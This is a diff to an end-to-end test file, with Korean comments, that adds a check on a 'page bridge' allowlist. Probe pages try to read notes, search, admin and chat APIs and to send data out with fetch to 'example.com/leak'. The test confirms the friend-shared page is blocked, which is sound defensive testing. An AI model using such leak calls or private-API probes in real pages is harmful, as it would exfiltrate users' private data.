@@ -380,6 +380,39 @@ try {
     } catch (e) { ok(false, `${tv} · 친구 페이지 숨기기 — ${String(e.message).split("\n")[0]}`); }
 
     });
+    // ---------- ⑨-2 페이지 브리지 허용 목록 — 친구가 공유한 페이지의 코드는 내 노트 · 검색을 못 읽고, 바깥으로 fetch 도 못 해요 ----------
+    await sec("page-bridge-guard", async () => {
+    let fctx = null; const made = [];
+    try {
+      // 페이지 코드: 여러 앱 API 를 불러 보고 결과를 #out 에 (ok:키들 / no), 바깥 fetch 는 CSP 위반(connect-src)이 나는지
+      const probe = (paths) => `<!doctype html><html><head><meta charset="utf-8"></head><body><pre id="out">…</pre><script>
+        const csp = []; addEventListener("securitypolicyviolation", (e) => csp.push(e.violatedDirective));
+        trio.onReady(async () => { const r = {};
+          for (const [m, p] of ${JSON.stringify(paths)}) { try { const d = await trio.api(m, p); r[m + " " + p] = "ok:" + Object.keys(d.user || d).sort().join(","); } catch (e) { r[m + " " + p] = "no"; } }
+          try { await trio.store.set("k", 1); r.store = "ok"; } catch { r.store = "no"; }
+          try { await fetch("https://example.com/leak?d=x"); r.fetch = "ok"; } catch { r.fetch = "no"; }
+          await new Promise((ok) => setTimeout(ok, 300)); r.csp = csp.join(",");
+          document.getElementById("out").textContent = JSON.stringify(r); });
+      </script></body></html>`;
+      const readOut = async (id) => {
+        await go("#/p/" + id, 3500);
+        const fr = p.frames().find((x) => x.url().includes("/pf/" + id));
+        for (let i = 0; i < 20 && fr; i++) { const t = await fr.evaluate(() => document.getElementById("out")?.textContent || "").catch(() => ""); if (t.startsWith("{")) return JSON.parse(t); await sleep(300); }
+        return null;
+      };
+      fctx = await browser.newContext();
+      await fctx.request.post(BASE + "/api/auth/login", { headers: H, data: { username: friend } });
+      const shared = (await (await fctx.request.post(BASE + "/api/pages", { headers: H, data: { title: "친구 탐색", shared: true, files: { "index.html": probe([["GET", "/notes"], ["GET", "/search?q=a"], ["GET", "/admin/users"], ["GET", "/plans?periods=D:2026-10-01"], ["GET", "/me"]]) } } })).json()).page.id;
+      const own = await mk({ title: "내 탐색", files: { "index.html": probe([["GET", "/ai/chats"], ["GET", "/room"], ["GET", "/plans?periods=D:2026-10-01"]]) } });
+      made.push(own);
+      const a = await readOut(shared), b = await readOut(own);
+      const sharedOk = a && a["GET /notes"] === "no" && a["GET /search?q=a"] === "no" && a["GET /admin/users"] === "no" && a["GET /plans?periods=D:2026-10-01"] === "no"
+        && a["GET /me"] === "ok:color,display_name,id,username" && a.store === "ok" && a.fetch === "no" && /connect-src/.test(a.csp);
+      const ownOk = b && b["GET /ai/chats"] === "no" && b["GET /room"] === "no" && b["GET /plans?periods=D:2026-10-01"] === "ok:plans" && /connect-src/.test(b.csp);
+      ok(sharedOk && ownOk, `${tv} · 페이지 브리지 허용 목록 — 친구 페이지 ${JSON.stringify(a)} · 내 페이지 ${JSON.stringify(b)}`);
+    } catch (e) { ok(false, `${tv} · 페이지 브리지 허용 목록 — ${String(e.message).split("\n")[0]}`); }
+    finally { for (const id of made) await ctx.request.delete(BASE + "/api/pages/" + id, { headers: H }).catch(() => {}); await fctx?.close(); }
+    });
     // ---------- ⑩ Study 그래프 ----------
     await sec("study-graph", async () => {
     try {
